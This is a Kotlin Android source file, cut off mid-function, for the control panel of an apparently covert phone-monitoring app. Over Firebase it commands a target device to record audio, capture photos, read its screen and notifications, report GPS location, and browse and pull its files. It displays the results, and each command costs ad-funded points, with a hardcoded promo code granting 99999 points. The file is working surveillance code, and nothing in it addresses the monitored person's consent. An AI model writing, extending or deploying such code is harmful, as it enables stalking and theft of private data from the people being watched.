package com.jonas.x24

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import java.util.regex.Pattern
import android.graphics.Rect
import android.view.WindowManager
import android.view.WindowInsetsController
import android.view.WindowInsets
import android.widget.ScrollView
import android.widget.FrameLayout
import com.google.android.material.tabs.TabLayout
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import android.app.Dialog
import android.graphics.drawable.ColorDrawable
import android.view.Window

import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebResourceRequest
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import org.osmdroid.config.Configuration
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.osmdroid.views.overlay.Polyline
import java.io.File
import java.io.FileOutputStream
import java.net.URL

class MonitorActivity : AppCompatActivity() {

    private lateinit var sessionKey: String
    private lateinit var database: DatabaseReference
    private lateinit var tvResults: TextView
    private lateinit var mapView: MapView
    private lateinit var btnSaveAudio: Button
    private lateinit var llResults: LinearLayout

    private lateinit var tabLayout: TabLayout
    private lateinit var tabControls: ScrollView
    private lateinit var tabFiles: LinearLayout
    private lateinit var tabScreen: FrameLayout
    private lateinit var tabMap: FrameLayout
    private lateinit var tabResults: ScrollView
    private lateinit var screenReconstructionView: ScreenReconstructionView
    private lateinit var btnFullScreenToggle: Button
    private var isFullScreen = false
    private var lastAudioBase64: String? = null
    private var lastImageUrl: String? = null
    private var lastScreenReadText: String? = null
    private var lastProcessedResultKey: String? = null

    // File Browser
    private var currentDirectoryPath = "/sdcard"
    private lateinit var tvCurrentPath: TextView
    private lateinit var lvFiles: android.widget.ListView
    private lateinit var pbFilesLoading: android.widget.ProgressBar

    // Points Manager
    private lateinit var pointsManager: PointsManager
    private lateinit var tvPointsBalance: TextView
    private lateinit var btnWatchAd: Button
    private lateinit var etPromoCode: android.widget.EditText
    private lateinit var btnRedeemPromo: Button

    // Direct Ad WebView
    private lateinit var adWebViewContainer: FrameLayout
    private lateinit var adWebView: WebView
    private var adStartTime: Long = 0

    // Unity Ads

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Configuration.getInstance().load(applicationContext, getSharedPreferences("osmdroid", Context.MODE_PRIVATE))
        setContentView(R.layout.activity_monitor)

        sessionKey = intent.getStringExtra("SESSION_KEY") ?: return finish()
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey)

        // Start alert service
        val alertIntent = Intent(this, com.jonas.x24.services.MonitorAlertService::class.java)
        alertIntent.putExtra("SESSION_KEY", sessionKey)
        startService(alertIntent)

        // Request POST_NOTIFICATIONS
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
            }
        }

        mapView = findViewById(R.id.mapView)
        mapView.setMultiTouchControls(true)

        btnSaveAudio = findViewById(R.id.btnSaveAudio)
        llResults = findViewById(R.id.llResults)
        tvResults = findViewById(R.id.tvResults)

        tabLayout = findViewById(R.id.tabLayout)
        tabControls = findViewById(R.id.tabControls)
        tabFiles = findViewById(R.id.tabFiles)
        tabScreen = findViewById(R.id.tabScreen)
        tabMap = findViewById(R.id.tabMap)
        tabResults = findViewById(R.id.tabResults)
        screenReconstructionView = findViewById(R.id.screenReconstructionView)
        btnFullScreenToggle = findViewById(R.id.btnFullScreenToggle)

        tvCurrentPath = findViewById(R.id.tvCurrentPath)
        lvFiles = findViewById(R.id.lvFiles)
        pbFilesLoading = findViewById(R.id.pbFilesLoading)

        pointsManager = PointsManager(this)
        tvPointsBalance = findViewById(R.id.tvPointsBalance)
        btnWatchAd = findViewById(R.id.btnWatchAd)

        adWebViewContainer = findViewById(R.id.adWebViewContainer)
        adWebView = findViewById(R.id.adWebView)

        setupAdWebView()
        etPromoCode = findViewById(R.id.etPromoCode)
        btnRedeemPromo = findViewById(R.id.btnRedeemPromo)

        updatePointsUI()

        btnWatchAd.setOnClickListener {
            showRewardedAd()
        }

        btnRedeemPromo.setOnClickListener {
            val code = etPromoCode.text.toString().trim()
            if (code.isNotEmpty()) {
                if (code == "D-TECH_services" || code == sessionKey) {
                    if (!pointsManager.isPromoCodeUsed(code)) {
                        pointsManager.setPoints(99999)
                        pointsManager.markPromoCodeUsed(code)
                        updatePointsUI()
                        Toast.makeText(this, "Promo code redeemed! Points set to 99999.", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(this, "Promo code already used.", Toast.LENGTH_SHORT).show()
                    }
                    etPromoCode.text.clear()
                } else {
                    val dbRef = FirebaseDatabase.getInstance().reference.child("access_codes").child(code)
                    dbRef.get().addOnSuccessListener { snapshot ->
                        if (snapshot.exists()) {
                            if (!pointsManager.isPromoCodeUsed(code)) {
                                pointsManager.setPoints(99999)
                                pointsManager.markPromoCodeUsed(code)
                                updatePointsUI()
                                Toast.makeText(this, "Promo code redeemed! Points set to 99999.", Toast.LENGTH_SHORT).show()
                            } else {
                                Toast.makeText(this, "Promo code already used.", Toast.LENGTH_SHORT).show()
                            }
                        } else {
                            Toast.makeText(this, "Invalid promo code.", Toast.LENGTH_SHORT).show()
                        }
                        etPromoCode.text.clear()
                    }.addOnFailureListener {
                        Toast.makeText(this, "Failed to verify promo code.", Toast.LENGTH_SHORT).show()
                    }
                }
            } else {
                Toast.makeText(this, "Please enter a promo code.", Toast.LENGTH_SHORT).show()
            }
        }

        setupTabs()
        setupFileBrowser()

        btnFullScreenToggle.setOnClickListener {
            toggleFullScreen()
        }

        btnSaveAudio.setOnClickListener {
            checkAndDeductPoints(30, "Save Audio") {
                saveLatestAudioToDownloads()
            }
        }

        findViewById<Button>(R.id.btnSaveImage).setOnClickListener {
            checkAndDeductPoints(50, "Save Image") {
                saveLatestImageToDownloads()
            }
        }

        findViewById<Button>(R.id.btnSaveScreen)?.setOnClickListener {
            checkAndDeductPoints(50, "Save Screen") {
                saveLatestScreenTextToDownloads()
            }
        }

        findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
            checkAndDeductPoints(15, "Read Notifications") {
                sendCommand("READ_NOTIFICATIONS")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
            checkAndDeductPoints(100, "Read Screen") {
                sendCommand("READ_SCREEN")
                tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
            }
        }

        findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
            checkAndDeductPoints(200, "Rec Audio") {
                sendCommand("START_RECORD_AUDIO")
            }
        }

        findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
            sendCommand("STOP_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
            checkAndDeductPoints(150, "Location") {
                sendCommand("GET_LOCATION")
                tabLayout.getTabAt(3)?.select() // Jump to Map
            }
        }

        findViewById<Button>(R.id.btnApps).setOnClickListener {
            checkAndDeductPoints(30, "View Apps") {
                startActivity(Intent(this, AppsActivity::class.java))
            }
        }

        findViewById<Button>(R.id.btnDeviceStats).setOnClickListener {
            checkAndDeductPoints(10, "Device Stats") {
                startActivity(Intent(this, DeviceStatsActivity::class.java))
            }
        }

        findViewById<Button>(R.id.btnAppUsageStats).setOnClickListener {
            checkAndDeductPoints(5, "App Usage") {
                sendCommand("GET_APP_USAGE")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnPlayAlarm).setOnClickListener {
            checkAndDeductPoints(250, "Play Alarm") {
                sendCommand("PLAY_ALARM")
            }
        }

        findViewById<Button>(R.id.btnCapturePhoto).setOnClickListener {
            checkAndDeductPoints(300, "Capture Photo") {
                sendCommand("CAPTURE_PHOTO")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnGetDeviceInfo)?.setOnClickListener {
            checkAndDeductPoints(10, "Fetch Info") {
                sendCommand("GET_DEVICE_INFO")
                tabLayout.getTabAt(4)?.select() // Jump to Results
            }
        }

        findViewById<Button>(R.id.btnLaunchApp)?.setOnClickListener {
            val et = findViewById<com.google.android.material.textfield.TextInputEditText>(R.id.etLaunchAppPackage)
            val pkg = et.text.toString().trim()
            if (pkg.isNotEmpty()) {
                checkAndDeductPoints(100, "Launch App") {
                    sendCommand("LAUNCH_APP:$pkg")
                    et.text?.clear()
                }
            } else {
                Toast.makeText(this, "Enter a package name", Toast.LENGTH_SHORT).show()
            }
        }

        findViewById<Button>(R.id.btnLogout).setOnClickListener {
            logout()
        }

        listenForResults()
        cleanupOldData()
    }

    override fun onResume() {
        super.onResume()
        mapView.onResume()
    }

    override fun onPause() {
        super.onPause()
        mapView.onPause()
    }

    private fun setupTabs() {
        tabLayout.addTab(tabLayout.newTab().setText("Controls"))
        tabLayout.addTab(tabLayout.newTab().setText("Files"))
        tabLayout.addTab(tabLayout.newTab().setText("Screen"))
        tabLayout.addTab(tabLayout.newTab().setText("Map"))
        tabLayout.addTab(tabLayout.newTab().setText("Logs"))

        tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener {
            override fun onTabSelected(tab: TabLayout.Tab?) {
                tabControls.visibility = View.GONE
                tabFiles.visibility = View.GONE
                tabScreen.visibility = View.GONE
                tabMap.visibility = View.GONE
                tabResults.visibility = View.GONE

                when (tab?.position) {
                    0 -> tabControls.visibility = View.VISIBLE
                    1 -> {
                        tabFiles.visibility = View.VISIBLE
                        // Load files if they haven't been loaded yet
                        if (lvFiles.adapter == null) {
                            checkAndDeductPoints(600, "Access Files") {
                                sendCommand("LIST_FILES:$currentDirectoryPath")
                                pbFilesLoading.visibility = View.VISIBLE
                            }
                        }
                    }
                    2 -> tabScreen.visibility = View.VISIBLE
                    3 -> tabMap.visibility = View.VISIBLE
                    4 -> tabResults.visibility = View.VISIBLE
                }
            }
            override fun onTabUnselected(tab: TabLayout.Tab?) {}
            override fun onTabReselected(tab: TabLayout.Tab?) {}
        })
    }

    private fun setupFileBrowser() {
        findViewById<Button>(R.id.btnFileUp).setOnClickListener {
            val parentFile = java.io.File(currentDirectoryPath).parentFile
            if (parentFile != null) {
                currentDirectoryPath = parentFile.absolutePath
                tvCurrentPath.text = currentDirectoryPath
                sendCommand("LIST_FILES:$currentDirectoryPath")
                pbFilesLoading.visibility = View.VISIBLE
                lvFiles.adapter = null
            }
        }

        lvFiles.setOnItemClickListener { _, _, position, _ ->
            val adapter = lvFiles.adapter as? FileAdapter
            val item = adapter?.getItem(position)
            if (item != null) {
                val type = item["type"] as String
                if (type == "FOLDER") {
                    val newPath = item["path"] as String
                    currentDirectoryPath = newPath
                    tvCurrentPath.text = currentDirectoryPath
                    sendCommand("LIST_FILES:$currentDirectoryPath")
                    pbFilesLoading.visibility = View.VISIBLE
                    lvFiles.adapter = null
                }
            }
        }
    }

    private fun toggleFullScreen() {
        isFullScreen = !isFullScreen
        if (isFullScreen) {
            tabLayout.visibility = View.GONE
            btnFullScreenToggle.text = "Exit Full Screen"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                window.insetsController?.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY)
            }
        } else {
            tabLayout.visibility = View.VISIBLE
            btnFullScreenToggle.text = "Full Screen"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.show(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
            }
        }
    }

    private fun logout() {
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().clear().apply()
        val intent = android.content.Intent(this, MainActivity::class.java)
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }


    private fun setupAdWebView() {
        adWebView.settings.javaScriptEnabled = true
        adWebView.settings.domStorageEnabled = true
        adWebView.settings.allowContentAccess = true
        adWebView.settings.allowFileAccess = true
        adWebView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false // Let WebView load HTTP/HTTPS
                }

                // Attempt to open custom schemes (e.g. shein://) via Intent
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    startActivity(intent)
                } catch (e: Exception) {
                    // Ignore if app not installed or any other issue
                }
                return true // Handled by us
            }
        }
    }

    private fun showRewardedAd() {
        val adUrl = "https://omg10.com/4/10205357"
        adWebView.loadUrl(adUrl)
        adWebViewContainer.visibility = View.VISIBLE
        adStartTime = System.currentTimeMillis()
    }

    private fun updatePointsUI() {
        tvPointsBalance.text = "Points: ${pointsManager.getPoints()}"
    }

    private fun checkAndDeductPoints(cost: Int, commandName: String, action: () -> Unit) {
        if (pointsManager.deductPoints(cost)) {
            updatePointsUI()
            action()
        } else {
            Toast.makeText(this, "Not enough points for $commandName (Need $cost). Watch an ad!", Toast.LENGTH_LONG).show()
        }
    }

    private fun sendCommand(command: String) {
        val commandRef = database.child("commands").push()
        val data = mapOf(
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        commandRef.setValue(data).addOnSuccessListener {
            Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
        }
    }

    private fun cleanupOldData() {
        val oneHourAgo = System.currentTimeMillis() - 3600000.0 // 1 hour in ms
        val storageRef = FirebaseStorage.getInstance().reference

        database.child("results").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val data = child.child("data").getValue(String::class.java)
                    val type = child.child("type").getValue(String::class.java)

                    if (data != null && (type == "IMAGE" || type == "FILE" || child.child("commandType").getValue(String::class.java) == "CAPTURE_PHOTO")) {
                        val storagePath = data.substringAfterLast("|", "")
                        if (storagePath.isNotEmpty() && storagePath != data) {
                            val fileRef = storageRef.child(storagePath)
                            fileRef.delete().addOnSuccessListener {
                                // successfully deleted from storage
                            }.addOnFailureListener {
                                // failed to delete from storage
                            }
                        }
                    }
                    child.ref.removeValue()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        database.child("commands").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    child.ref.removeValue()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenForResults() {
        database.child("results").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val children = snapshot.children.toList()
                val latestKey = children.lastOrNull()?.key
                val shouldRedirect = lastProcessedResultKey != null && latestKey != lastProcessedResultKey

                // Clear map overlays before adding new ones from history
                mapView.overlays.clear()
                val geoPoints = mutableListOf<GeoPoint>()

                // Rebuild UI history
                llResults.removeAllViews()
                llResults.addView(tvResults) // Keep the original text view at top if needed
                llResults.addView(btnSaveAudio)

                for (child in children) {
                    val type = child.child("type").value as? String
                    val data = child.child("data").value as? String

                    val isNewAndLatest = shouldRedirect && child.key == latestKey

                    if (type != null && data != null) {
                        appendResultToHistory(type, data, geoPoints, isNewAndLatest)
                    }
                }

                if (latestKey != null) {
                    lastProcessedResultKey = latestKey
                }

                // Update map if locations exist
                if (geoPoints.isNotEmpty()) {
                    mapView.visibility = View.VISIBLE
                    val polyline = Polyline()
                    polyline.setPoints(geoPoints)
                    polyline.color = Color.BLUE
                    mapView.overlays.add(polyline)

                    val currentPoint = geoPoints.last()
                    val marker = Marker(mapView)
                    marker.position = currentPoint
                    marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
                    marker.title = "Current Location"
                    mapView.overlays.add(marker)

                    mapView.controller.setZoom(15.0)
                    mapView.controller.setCenter(currentPoint)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>, shouldRedirect: Boolean = false) {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 16, 0, 16)
        }

        val tv = TextView(this).apply {
            textSize = 14f
            setTextIsSelectable(true)
        }

        when (type) {
            "FILE_LIST" -> {
                try {
                    val map = com.google.gson.Gson().fromJson(data, Map::class.java) as Map<String, Any>
                    val path = map["currentPath"] as String
                    val files = map["files"] as List<Map<String, Any>>

                    currentDirectoryPath = path
                    tvCurrentPath.text = currentDirectoryPath

                    val adapter = FileAdapter(this@MonitorActivity, files) { filePath ->
                        // Check if it's a picture based on extension for FETCH_PIC command
                        if (filePath.endsWith(".jpg", true) || filePath.endsWith(".jpeg", true) ||
                            filePath.endsWith(".png", true) || filePath.endsWith(".webp", true)) {
                            sendCommand("FETCH_PIC:$filePath")
                            Toast.makeText(this@MonitorActivity, "Requesting picture...", Toast.LENGTH_SHORT).show()
                        } else {
                            sendCommand("FETCH_FILE:$filePath")
                            Toast.makeText(this@MonitorActivity, "Requesting file...", Toast.LENGTH_SHORT).show()
                        }
                    }
                    lvFiles.adapter = adapter
                    pbFilesLoading.visibility = View.GONE

                    tv.text = "Listed files in $path"
                    container.addView(tv)
                } catch (e: Exception) {
                    pbFilesLoading.visibility = View.GONE
                    tv.text = "Failed to parse file list: ${e.message}"
                    container.addView(tv)
                }
            }
            "TEXT" -> {
                if (data.startsWith("Screen Context:")) {
                    tv.text = "Screen Read Received and Rendered in Screen Tab."
                    tv.setTypeface(null, android.graphics.Typeface.BOLD)
                    container.addView(tv)
                    lastScreenReadText = data
                    buildScreenReadUI(data) // Parse and pass to ScreenReconstructionView

                    // Switch to Screen tab if not already there
                    if (shouldRedirect) tabLayout.getTabAt(2)?.select()
                } else if (data.contains("Coords:")) {
                    tv.text = data
                    container.addView(tv)
                    parseLocationData(data, geoPoints)
                    if (shouldRedirect) tabLayout.getTabAt(3)?.select() // Jump to Map
                } else {
                    tv.text = "Text Result:\n$data"
                    container.addView(tv)
                    if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
                }
            }
            "IMAGE" -> {
                tv.text = "Loading image from storage..."
                container.addView(tv)
                val url = data.substringBefore("|")
                lastImageUrl = url
                findViewById<Button>(R.id.btnSaveImage).visibility = View.VISIBLE

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val inputStream = URL(url).openStream()
                        val bitmap = BitmapFactory.decodeStream(inputStream)

                        withContext(Dispatchers.Main) {
                            tv.text = "Image loaded."
                            val imageView = findViewById<ImageView>(R.id.ivFetchedImage)
                            val targetImageView = if (imageView != null) {
                                imageView.setImageBitmap(bitmap)
                                imageView.visibility = View.VISIBLE
                                imageView
                            } else {
                                val newImageView = ImageView(this@MonitorActivity).apply {
                                    setImageBitmap(bitmap)
                                    adjustViewBounds = true
                                    layoutParams = LinearLayout.LayoutParams(
                                        LinearLayout.LayoutParams.MATCH_PARENT,
                                        LinearLayout.LayoutParams.WRAP_CONTENT
                                    ).apply {
                                        setMargins(0, 16, 0, 16)
                                    }
                                }
                                container.addView(newImageView)
                                newImageView
                            }

                            targetImageView.setOnClickListener {
                                val dialog = Dialog(this@MonitorActivity)
                                dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
                                val fullScreenImageView = ImageView(this@MonitorActivity).apply {
                                    setImageBitmap(bitmap)
                                    adjustViewBounds = true
                                    scaleType = ImageView.ScaleType.FIT_CENTER
                                    setOnClickListener { dialog.dismiss() }
                                }
                                dialog.setContentView(fullScreenImageView)
                                dialog.window?.apply {
                                    setBackgroundDrawable(ColorDrawable(Color.BLACK))
                                    setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT)
                                }
                                dialog.show()
                            }
                        }
                    } catch (e: Exception) {
                        withContext(Dispatchers.Main) {
                            val errorTv = TextView(this@MonitorActivity).apply { text = "Failed to download/decode image." }
                            container.addView(errorTv)
                        }
                    }
                }
                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
            }
            "AUDIO" -> {
                tv.text = "Audio received."
                container.addView(tv)
                lastAudioBase64 = data
                btnSaveAudio.visibility = View.VISIBLE

                val btnPlay = Button(this).apply {
                    text = "Play Audio"
                    setOnClickListener { playAudioFromBase64(data) }
                }
                container.addView(btnPlay)
                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
            }
            "FILE" -> {
                val parts = data.split("|")
                if (parts.size >= 2) {
                    val fileName = parts[0]
                    val url = parts[1]
                    tv.text = "File received: $fileName"
                    container.addView(tv)

                    val btnSaveFile = Button(this).apply {
                        text = "Save $fileName (Cost: 50)"
                        setOnClickListener {
                            checkAndDeductPoints(50, "Save File") {
                                downloadAndSaveFileFromUrl(fileName, url)
                            }
                        }
                    }
                    container.addView(btnSaveFile)
                } else {
                    tv.text = "Invalid file data received."
                    container.addView(tv)
                }
                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
            }
            "ERROR" -> {
                tv.text = "Error: $data"
                tv.setTextColor(Color.RED)
                container.addView(tv)
                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
            }
        }

        llResults.addView(container, 0) // Add to top
    }

    private fun buildScreenReadUI(data: String) {
        val lines = data.lines().drop(1) // Drop "Screen Context:" line
        val elements = mutableListOf<ScreenElement>()

        // Example format: [Button] Submit (bounds: 100,200,300,400) id: submit_btn
        val regex = Pattern.compile("\\[(.*?)\\](.*?)\\(bounds: (-?\\d+),(-?\\d+),(-?\\d+),(-?\\d+)\\)(.*)")

        for (line in lines) {
            if (line.isBlank()) continue
            val matcher = regex.matcher(line)
            if (matcher.find()) {
                val type = matcher.group(1)?.trim() ?: "Text"
                val label = matcher.group(2)?.trim() ?: ""
                val left = matcher.group(3)?.toIntOrNull() ?: 0
                val top = matcher.group(4)?.toIntOrNull() ?: 0
                val right = matcher.group(5)?.toIntOrNull() ?: 0
                val bottom = matcher.group(6)?.toIntOrNull() ?: 0

                // Avoid degenerate bounds
                if (right > left && bottom > top) {
                    val rect = Rect(left, top, right, bottom)
                    elements.add(ScreenElement(type, label, rect))
                }
            }
        }

        screenReconstructionView.setElements(elements)
    }

    private fun parseLocationData(data: String, geoPoints: MutableList<GeoPoint>) {
        val coordsLine = data.lines().find { it.startsWith("Coords:") }
        if (coordsLine != null) {
            val parts = coordsLine.removePrefix("Coords:").trim().split(",")
            if (parts.size == 2) {
                try {
                    val lat = parts[0].trim().toDouble()
                    val lon = parts[1].trim().toDouble()
                    geoPoints.add(GeoPoint(lat, lon))
                } catch (e: Exception) {
                    // Ignore parse errors
                }
            }
        }
    }

    private fun playAudioFromBase64(base64Audio: String) {
        try {
            val audioBytes = Base64.decode(base64Audio, Base64.DEFAULT)
            val tempFile = File.createTempFile("received_audio", ".3gp", cacheDir)
            val fos = FileOutputStream(tempFile)
            fos.write(audioBytes)
            fos.close()

            val mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(tempFile.absolutePath)
            mediaPlayer.prepare()
            mediaPlayer.start()

            mediaPlayer.setOnCompletionListener {
                it.release()
                tempFile.delete()
            }
        } catch (e: Exception) {
            tvResults.text = "Error playing audio: ${e.message}"
        }
    }

    private fun saveLatestAudioToDownloads() {
        val audioBase64 = lastAudioBase64
        if (audioBase64 == null) {
            Toast.makeText(this, "No audio to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val audioBytes = Base64.decode(audioBase64, Base64.DEFAULT)
            val fileName = "x24_audio_${System.currentTimeMillis()}.3gp"

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.MIME_TYPE, "audio/3gpp")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        outputStream.write(audioBytes)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                // Fallback for older versions
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    fos.write(audioBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving audio: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun saveLatestImageToDownloads() {
        val imageUrl = lastImageUrl
        if (imageUrl == null) {
            Toast.makeText(this, "No image to save.", Toast.LENGTH_SHORT).show()
            return
        }
        val fileName = "x24_image_${System.currentTimeMillis()}.jpg"
        downloadAndSaveFileFromUrl(fileName, imageUrl)
    }

    private fun downloadAndSaveFileFromUrl(fileName: String, urlString: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = URL(urlString)
                val connection = url.openConnection()
                connection.connect()
                val inputStream = connection.getInputStream()

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val resolver = applicationContext.contentResolver
                    val contentValues = ContentValues().apply {
                        put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                        put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                    }

                    val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                    if (uri != null) {
                        resolver.openOutputStream(uri)?.use { outputStream ->
                            inputStream.copyTo(outputStream)
                        }
                        withContext(Dispatchers.Main) {
                            Toast.makeText(this@MonitorActivity, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                        }
                    } else {
                        withContext(Dispatchers.Main) {
                            Toast.makeText(this@MonitorActivity, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                        }
                    }
                } else {
                    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                    val file = File(downloadsDir, fileName)
                    FileOutputStream(file).use { fos ->
                        inputStream.copyTo(fos)
                    }
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@MonitorActivity, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                    }
                }
                inputStream.close()
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@MonitorActivity, "Error saving file: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun saveFileToDownloads(fileName: String, base64Data: String) {
        try {
            val fileBytes = Base64.decode(base64Data, Base64.DEFAULT)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        outputStream.write(fileBytes)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    fos.write(fileBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving file: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun saveLatestScreenTextToDownloads() {
        if (lastScreenReadText == null) {
            Toast.makeText(this, "No screen data to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val bitmap = android.graphics.Bitmap.createBitmap(screenReconstructionView.width, screenReconstructionView.height, android.graphics.Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bitmap)
            screenReconstructionView.draw(canvas)

